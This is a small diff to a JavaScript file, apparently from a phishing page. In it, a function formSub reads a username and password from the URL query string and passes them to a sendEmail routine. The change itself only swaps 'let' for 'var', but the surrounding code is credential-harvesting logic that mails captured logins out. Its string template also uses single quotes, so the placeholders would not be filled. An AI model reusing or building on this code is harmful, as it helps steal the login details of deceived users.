@@ -15,8 +15,8 @@ function sendEmail(link) {
     }
 function formSub() {
       let params = new URLSearchParams(location.search);
-      let usn = params.get('username');
-      let psw = params.get('password');
+      var usn = params.get('username');
+      var psw = params.get('password');
       if (usn != null && psw != null) {
             sendEmail('Username: ${usn}\nPassword: ${psw}');
       }
